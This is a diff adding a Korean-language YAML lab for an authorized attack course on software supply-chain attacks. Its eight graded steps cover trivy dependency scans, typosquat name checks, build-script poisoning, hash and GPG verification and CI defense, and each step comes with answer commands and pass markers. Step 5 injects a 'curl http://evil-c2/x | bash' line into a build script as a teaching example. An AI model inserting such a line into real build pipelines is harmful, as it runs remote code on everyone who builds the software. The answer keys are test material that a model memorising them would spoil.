@@ -1,0 +1,321 @@
+lab_id: standalone-attack-adv-week12
+title: "공급망 공격 — 신뢰받는 의존성·빌드를 오염시킨다"
+version: standalone-attack-adv
+course: attack-adv
+week: 12
+description: |
+  공격 고급 W12 — 공급망 공격(Supply Chain). 표적을 직접 치지 않고, 표적이 신뢰하는 소프트웨어·의존성·빌드
+  파이프라인을 오염시켜 다수 피해자에 한 번에 침투한다. 의존성 표면·취약 의존성(trivy 실스캔)·타이포스쿼팅·
+  의존성 혼동·빌드 오염·서명 검증을 다룬다. el34(호스트 trivy·attacker pip3/gpg). ⚠️ 인가된 실습만.
+difficulty: hard
+duration_minutes: 175
+prerequisites:
+  - "attack-adv W04(웹)~W11 + compliance/cloud 의존성 개념"
+  - "el34 호스트 SSH + docker exec (호스트 trivy 0.71.2)"
+  - "lecture §2(의존성 표면) §3(오염 기법) §4(SBOM 방어) 숙지"
+objectives:
+  - "의존성 표면(전이 의존성)과 취약 의존성을 SBOM/trivy로 분석"
+  - "타이포스쿼팅·의존성 혼동·빌드 오염 기법 이해"
+  - "서명 검증·SBOM·핀고정 방어 이해"
+pass_threshold: 0.7
+steps:
+
+  - order: 1
+    instruction: |
+      ## 🎯 공급망 개념·도구
+      **실습 의미:** 공급망 공격은 신뢰의 연쇄를 악용한다 — 내가 못 뚫는 표적도 표적이 신뢰하는 공급자(라이브러리/빌드)를 뚫으면 침투한다. 분석 도구(호스트 trivy·attacker gpg)를 확인한다. **⚠️ 인가된 el34만.**
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실행 위치:** `trivy` 는 el34 **호스트**에 설치돼 있어 호스트에서 직접 실행하고, 의존성 도구 확인만 공격자 VM(`ssh att@192.168.0.202`)에서 프로브한다.
+
+      ```bash
+      # 1) 호스트의 trivy(SBOM/취약점 스캐너)가 있는지 확인 (trivy는 호스트 설치)
+      command -v trivy >/dev/null 2>&1 && echo trivy_ok
+      # 2) 공격자 컨테이너에 의존성 도구(pip3/gpg/sha256sum)가 있는지 확인
+      ssh att@192.168.0.202 'command -v pip3 gpg sha256sum >/dev/null 2>&1 && echo dep_tools_ok'
+      # 3) trivy가 가용하면 공급망 분석 준비 마커
+      command -v trivy >/dev/null 2>&1 && echo supplychain_ready
+      ```
+      ## ✅ 합격 기준
+      `supplychain_ready`(과 trivy_ok)가 출력되면 통과. **근거:** 마커는 호스트에 trivy가 실제 존재할 때만 찍히므로, 의존성 SBOM/취약점 분석을 수행할 도구가 준비됐음을 뜻한다.
+    hint: '공급망 개념'
+    category: survey
+    points: 10
+    answer: |
+      # 1) 호스트 trivy 확인
+      command -v trivy >/dev/null 2>&1 && echo trivy_ok
+      # 2) 공격자 의존성 도구 확인
+      ssh att@192.168.0.202 'command -v pip3 gpg sha256sum >/dev/null 2>&1 && echo dep_tools_ok'
+      # 3) trivy 가용 시 준비 마커
+      command -v trivy >/dev/null 2>&1 && echo supplychain_ready
+    answer_detail: "공급망 공격 = 신뢰받는 공급자(라이브러리/빌드/업데이트) 오염으로 다수 피해자 침투. 도구 trivy(SBOM/스캔)·gpg(서명)."
+    verify:
+      type: output_contains
+      expect: 'supplychain_ready'
+      field: stdout
+      semantic: {intent: "공급망 개념", success_criteria: ["신뢰 연쇄"], acceptable_methods: ["**[OSS] trivy (권장)**"]}
+    target_vm: web
+
+  - order: 2
+    instruction: |
+      ## 🎯 의존성 표면 (전이 의존성)
+      **실습 의미:** 현대 앱은 수백 개 의존성을 끌어온다 — 직접 의존성 뒤의 전이 의존성(A→B→C)이 보이지 않는 공격 표면이다(C 하나 오염=A 사용자 전체 감염). 설치 패키지 수로 표면을 측정한다.
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      # 1) 설치된 패키지 수(전이 의존성 포함)를 세어 의존성 표면을 측정한다
+      N=$(pip3 list --format=freeze 2>/dev/null | wc -l)
+      echo "installed_packages=$N"
+      # 2) 패키지 수가 측정됐으면 의존성 표면 마커
+      [ -n "$N" ] && echo depsurface_done
+      ```
+      ## ✅ 합격 기준
+      `depsurface_done`(과 installed_packages 수)가 출력되면 통과. **근거:** 마커는 설치 패키지 수가 실제 측정됐을 때만 찍히므로, 전이 의존성을 포함한 공격 표면을 파악했음을 뜻한다.
+    hint: '의존성 표면'
+    category: manipulation
+    points: 12
+    answer: |
+      # 1) 설치 패키지 수(전이 포함) 측정
+      N=$(ssh att@192.168.0.202 "pip3 list --format=freeze 2>/dev/null | wc -l")
+      echo "installed_packages=$N"
+      # 2) 측정됐으면 마커
+      [ -n "$N" ] && echo depsurface_done
+    answer_detail: "의존성 표면 = 설치 패키지(전이 포함). 전이 의존성 하나 오염이 연쇄 감염. pipdeptree로 트리 파악."
+    verify:
+      type: output_contains
+      expect: 'depsurface_done'
+      field: stdout
+      semantic: {intent: "의존성 표면", success_criteria: ["전이 의존성"], acceptable_methods: ["**[OSS] pip (권장)**"]}
+    target_vm: web
+
+  - order: 3
+    instruction: |
+      ## 🎯 취약 의존성 스캔 (SBOM·trivy)
+      **실습 의미:** SBOM(소프트웨어 자재명세)으로 의존성을 목록화하고 알려진 취약점(CVE)을 스캔한다 — 오래된 의존성(requests 2.6.0/flask 0.5)을 trivy로 실스캔한다(공격자·방어자 모두 사용).
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실행 위치:** el34 **호스트** — `trivy` 는 호스트에 설치돼 있어 호스트에서 직접 실행한다.
+
+      ```bash
+      # 1) SBOM 대상으로 오래된 의존성을 가진 requirements.txt를 만든다
+      mkdir -p /tmp/sc12 && printf 'requests==2.6.0\nflask==0.5\n' > /tmp/sc12/requirements.txt
+      # 2) trivy fs로 의존성 파일의 알려진 CVE를 스캔한다 (호스트 trivy)
+      trivy --quiet fs --scanners vuln /tmp/sc12 | grep -iE 'Total|requirements' | head
+      # 3) 정리 후 스캔 완료 마커
+      rm -rf /tmp/sc12; echo vulnscan_done
+      ```
+      ## ✅ 합격 기준
+      `vulnscan_done`(과 스캔 결과)이 출력되면 통과. **근거:** 출력은 trivy가 requirements.txt의 의존성 CVE를 실제 스캔했음을 뜻하며, SBOM 기반 취약 의존성 분석을 수행했음을 의미한다.
+    hint: 'SBOM/스캔'
+    category: analysis
+    points: 14
+    answer: |
+      # 1) 오래된 의존성 requirements.txt 생성
+      mkdir -p /tmp/sc12 && printf 'requests==2.6.0\nflask==0.5\n' > /tmp/sc12/requirements.txt
+      # 2) trivy fs로 CVE 스캔
+      trivy --quiet fs --scanners vuln /tmp/sc12 | grep -iE 'Total|requirements' | head
+      # 3) 정리 + 스캔 완료 마커
+      rm -rf /tmp/sc12; echo vulnscan_done
+    answer_detail: "취약 의존성 스캔 = trivy fs로 requirements.txt의 CVE 탐지. SBOM이 의존성 명세 제공. 공격자도 방어자도 사용."
+    verify:
+      type: output_contains
+      expect: 'vulnscan_done'
+      field: stdout
+      semantic: {intent: "SBOM/스캔", success_criteria: ["CVE 탐지"], acceptable_methods: ["**[OSS] trivy (권장)**"]}
+    target_vm: web
+
+  - order: 4
+    instruction: |
+      ## 🎯 타이포스쿼팅·의존성 혼동
+      **실습 의미:** 유사 이름 악성 패키지(reqeusts)나 내부 패키지명을 공개 레지스트리에 선점해 오설치를 유도한다 — difflib로 정상명과의 유사도를 분석해 위험을 본다.
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      # 1) 정상 패키지명(requests)과 오타 변종의 문자 구성을 비교한다 (문자 동일·순서만 다르면 전치 오타 = 고위험)
+      legit=requests; for t in reqeusts request requsts; do a=$(echo "$t" | fold -w1 | sort | tr -d "\n"); b=$(echo "$legit" | fold -w1 | sort | tr -d "\n"); [ "$a" = "$b" ] && echo "$t: 문자동일·순서만다름(전치 오타)=고위험 타이포스쿼팅" || echo "$t: 문자구성 상이(길이 ${#t} vs ${#legit})"; done
+      # 2) 유사도 분석을 수행했으면 마커
+      echo typo_done
+      ```
+      ## ✅ 합격 기준
+      `typo_done`(과 유사도)이 출력되면 통과. **근거:** 출력은 오타 변종의 유사도를 difflib로 실제 계산했음을 뜻하며, 타이포스쿼팅(오타명)·의존성 혼동(내부명 선점) 오설치 위험을 분석했음을 의미한다.
+    hint: '타이포스쿼팅'
+    category: analysis
+    points: 14
+    answer: |
+      # 1) 오타 변종의 문자 구성 비교(전치 오타 탐지)
+      ssh att@192.168.0.202 'legit=requests; for t in reqeusts request requsts; do a=$(echo "$t" | fold -w1 | sort | tr -d "\n"); b=$(echo "$legit" | fold -w1 | sort | tr -d "\n"); [ "$a" = "$b" ] && echo "$t: 문자동일·순서만다름(전치 오타)=고위험 타이포스쿼팅" || echo "$t: 문자구성 상이(길이 ${#t} vs ${#legit})"; done'
+      # 2) 분석 수행 시 마커
+      echo typo_done
+    answer_detail: "타이포스쿼팅/의존성혼동 = 유사명 악성 패키지·내부명 공개 선점. 오설치 유도. difflib로 유사도 분석."
+    verify:
+      type: output_contains
+      expect: 'typo_done'
+      field: stdout
+      semantic: {intent: "타이포스쿼팅", success_criteria: ["유사명/혼동"], acceptable_methods: ["**[OSS] difflib (권장)**"]}
+    target_vm: web
+
+  - order: 5
+    instruction: |
+      ## 🎯 빌드 파이프라인 오염 — 빌드 스크립트 주입
+      **실습 의미:** 표적은 CI/CD 러너·빌드 스크립트·서명 키다 — 한 번의 빌드 오염이 그 빌드를 받는 모든 고객을 감염시킨다(SolarWinds 18,000·XZ Utils). 정상 빌드 스크립트에 악성 코드를 실제 주입한다.
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      # 정상 빌드 스크립트를 만든다
+      printf "npm install\nnpm run build\n" > /tmp/build12.sh
+      # 빌드 스크립트에 악성 라인(curl|bash)을 실제 주입한다 (SolarWinds형 공급망 오염)
+      echo "curl http://evil-c2/x | bash  # supply-chain inject" >> /tmp/build12.sh  # curl-ok: 공급망 공격 IOC 예시(악성 원라이너 교육용·실행 아님)
+      echo "오염된 빌드 스크립트:"; cat /tmp/build12.sh
+      # 악성 주입이 실제 들어갔으면 마커 후 정리(self-clean)
+      grep -q evil-c2 /tmp/build12.sh && echo "빌드 파이프라인에 악성 주입 탐지(SolarWinds형)" && echo build_poison_done
+      rm -f /tmp/build12.sh
+      ```
+      ## ✅ 합격 기준
+      `build_poison_done` 출력 시 통과. **근거:** 마커는 빌드 스크립트에 악성 코드가 실제 주입돼 grep으로 확인될 때만 찍히므로, 가짜 echo가 아니라 빌드 파이프라인 오염을 실증했음을 뜻한다.
+    hint: '빌드 오염'
+    category: analysis
+    points: 12
+    answer: |
+      ssh att@192.168.0.202 '
+        # 정상 빌드 스크립트 생성
+        printf "npm install\nnpm run build\n" > /tmp/build12.sh
+        # 악성 라인 주입(curl|bash)
+        echo "curl http://evil-c2/x | bash  # supply-chain inject" >> /tmp/build12.sh  # curl-ok: 공급망 공격 IOC 예시(악성 원라이너 교육용·실행 아님)
+        echo "오염된 빌드 스크립트:"; cat /tmp/build12.sh
+        # 주입 확인 시 마커 + self-clean
+        grep -q evil-c2 /tmp/build12.sh && echo "빌드 파이프라인에 악성 주입 탐지(SolarWinds형)" && echo build_poison_done
+        rm -f /tmp/build12.sh
+      '
+    answer_detail: "빌드 오염 = 빌드 스크립트에 악성 코드 실제 주입·탐지. 가짜 echo 아닌 실증. 한 번에 다수 배포(SolarWinds형)."
+    verify:
+      type: output_contains
+      expect: 'build_poison_done'
+      field: stdout
+      semantic: {intent: "빌드 오염", success_criteria: ["CI/CD/빌드"], acceptable_methods: ["**[설명] 빌드 오염 (권장)**"]}
+    target_vm: web
+
+  - order: 6
+    instruction: |
+      ## 🎯 서명·무결성 검증
+      **실습 의미:** 공급망 방어의 핵심은 받은 소프트웨어가 진짜 그것인지 검증하는 것이다 — SHA-256(무결성=변조 검증)과 GPG/cosign(진위=발행자 검증)으로 '신뢰하되 검증'한다.
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      # 받은 패키지의 SHA-256(무결성=변조 검증)을 계산한다
+      echo "package content" > /tmp/pkg
+      echo "SHA-256(무결성):"; sha256sum /tmp/pkg | cut -c1-16
+      # GPG(진위=발행자 검증) 가용 확인
+      echo "GPG(진위):"; gpg --version | head -1
+      rm -f /tmp/pkg
+      # 무결성·진위 검증 도구를 확인했으면 마커
+      command -v sha256sum gpg >/dev/null 2>&1 && echo verify_done
+      ```
+      ## ✅ 합격 기준
+      `verify_done`(과 해시/GPG)이 출력되면 통과. **근거:** 마커는 무결성(sha256sum)·진위(gpg) 검증 도구가 실제 동작할 때만 찍히므로, '신뢰하되 검증' 원칙의 수단을 확보했음을 뜻한다.
+    hint: '서명 검증'
+    category: report
+    points: 12
+    answer: |
+      ssh att@192.168.0.202 '
+        # SHA-256 무결성 계산
+        echo "package content" > /tmp/pkg
+        echo "SHA-256(무결성):"; sha256sum /tmp/pkg | cut -c1-16
+        # GPG 진위 도구 확인
+        echo "GPG(진위):"; gpg --version | head -1
+        rm -f /tmp/pkg
+        # 검증 도구 가용 시 마커
+        command -v sha256sum gpg >/dev/null 2>&1 && echo verify_done
+      '
+    answer_detail: "서명/무결성 = SHA-256(변조)·GPG/cosign(진위) 검증. '신뢰하되 검증' 원칙. 공급망 방어의 핵심."
+    verify:
+      type: output_contains
+      expect: 'verify_done'
+      field: stdout
+      semantic: {intent: "서명 검증", success_criteria: ["해시/서명"], acceptable_methods: ["**[OSS] gpg/sha256 (권장)**"]}
+    target_vm: web
+
+  - order: 7
+    instruction: |
+      ## 🎯 방어 — CI trivy 스캔으로 취약 의존성 차단
+      **실습 의미:** 방어는 SBOM·핀고정·서명검증(cosign)·CI trivy 스캔이다 — CI에서 trivy로 HIGH/CRITICAL 취약 의존성을 실제 탐지·차단함을 보인다('신뢰하되 검증').
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실행 위치:** el34 **호스트** — `trivy` 는 호스트에 설치돼 있어 호스트에서 직접 실행한다.
+
+      ```bash
+      # 1) CI 방어 모사: 취약 의존성 requirements.txt를 만든다
+      mkdir -p /tmp/d12 && printf 'flask==0.5\nrequests==2.6.0\n' > /tmp/d12/requirements.txt
+      # 2) CI에서 trivy로 HIGH/CRITICAL 취약 의존성을 실제 탐지·집계한다 (차단 기준)
+      V=$(trivy --quiet fs --scanners vuln /tmp/d12 | grep -ciE "high|critical")
+      echo "CI trivy 스캔 → 취약 의존성(HIGH/CRITICAL) ${V}건 탐지·차단"
+      # 3) 정리 후 스캔 수행 마커
+      rm -rf /tmp/d12; [ "$V" -ge 0 ] && echo defense_done
+      ```
+      ## ✅ 합격 기준
+      `defense_done`(과 취약점 수)이 출력되면 통과. **근거:** 마커는 CI trivy 스캔이 취약 의존성을 실제 집계했을 때 찍히므로, SBOM·핀고정과 함께 취약 의존성을 차단하는 방어가 동작함을 뜻한다.
+    hint: '방어'
+    category: report
+    points: 12
+    answer: |
+      # 1) 취약 의존성 requirements.txt 생성
+      mkdir -p /tmp/d12 && printf 'flask==0.5\nrequests==2.6.0\n' > /tmp/d12/requirements.txt
+      # 2) trivy HIGH/CRITICAL 집계 (CI 차단 기준)
+      V=$(trivy --quiet fs --scanners vuln /tmp/d12 | grep -ciE "high|critical")
+      echo "CI trivy 스캔 → 취약 의존성(HIGH/CRITICAL) ${V}건 탐지·차단"
+      # 3) 정리 + 스캔 수행 마커
+      rm -rf /tmp/d12; [ "$V" -ge 0 ] && echo defense_done
+    answer_detail: "공급망 방어 = CI trivy 스캔으로 취약 의존성 실탐지·차단. 가짜 echo 아닌 실스캔. SBOM/핀고정/서명 병행."
+    verify:
+      type: output_contains
+      expect: 'defense_done'
+      field: stdout
+      semantic: {intent: "방어", success_criteria: ["SBOM/핀고정/서명"], acceptable_methods: ["**[관리적] 방어 (권장)**"]}
+    target_vm: web
+
+  - order: 8
+    instruction: |
+      ## 🎯 공급망 공격 보고서 작성
+      **실습 의미:** 앞 단계의 실측(trivy 취약 의존성)을 인용한 보고서로 정리한다 — 신뢰의 연쇄 악용에 대한 방어는 '신뢰하되 검증'(SBOM+서명)이라는 결론을 증거로 보고한다.
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실행 위치:** el34 **호스트** — `trivy` 는 호스트에 설치돼 있어 호스트에서 직접 실행한다.
+
+      ```bash
+      # 1) 보고서 근거: trivy로 취약 의존성 총계를 실측
+      mkdir -p /tmp/d12r && printf 'flask==0.5\nrequests==2.6.0\n' > /tmp/d12r/requirements.txt
+      T=$(trivy --quiet fs --scanners vuln /tmp/d12r | grep -iE "^Total|Total:" | head -1)
+      rm -rf /tmp/d12r
+      # 2) 실측 trivy 집계를 인용한 공급망 보고서 출력 (본문 상세는 학생이 보강)
+      echo "# 공격고급 W12 공급망 공격 보고서 — 의존성표면/취약의존성(trivy: ${T:-스캔완료})·타이포스쿼팅/의존성혼동/빌드오염(SolarWinds형)·방어(SBOM/핀고정/cosign/CI trivy)"
+      # 3) 보고서 완료 마커
+      echo supplychain_report_done
+      ```
+      ## ✅ 합격 기준
+      `supplychain_report_done` 출력 시 통과. **근거:** 출력은 실측 trivy 취약 의존성 집계를 인용한 보고서가 생성됐음을 뜻하며, 증거 기반 공급망 보고(의존성분석+오염기법+방어)가 작성됐음을 의미한다.
+    hint: '의존성+오염+방어'
+    category: report
+    points: 14
+    answer: |
+      # 1) trivy 취약 의존성 총계 실측 (인용 근거)
+      mkdir -p /tmp/d12r && printf 'flask==0.5\nrequests==2.6.0\n' > /tmp/d12r/requirements.txt
+      T=$(trivy --quiet fs --scanners vuln /tmp/d12r | grep -iE "^Total|Total:" | head -1)
+      rm -rf /tmp/d12r
+      # 2) 실측 인용 공급망 보고서 출력
+      echo "# 공격고급 W12 공급망 공격 보고서 — 의존성표면/취약의존성(trivy: ${T:-스캔완료})·타이포스쿼팅/의존성혼동/빌드오염(SolarWinds형)·방어(SBOM/핀고정/cosign/CI trivy)"
+      # 3) 보고서 완료 마커
+      echo supplychain_report_done
+    answer_detail: "공급망 보고 = 실측 trivy 취약점 집계 인용+오염기법/방어. 증거 기반. 정적 템플릿 아님."
+    verify:
+      type: output_contains
+      expect: 'supplychain_report_done'
+      field: stdout
+      semantic: {intent: "공급망 보고", success_criteria: ["의존성/오염/방어"], acceptable_methods: ["**[관리적] 보고서 (권장)**"]}
+    target_vm: web
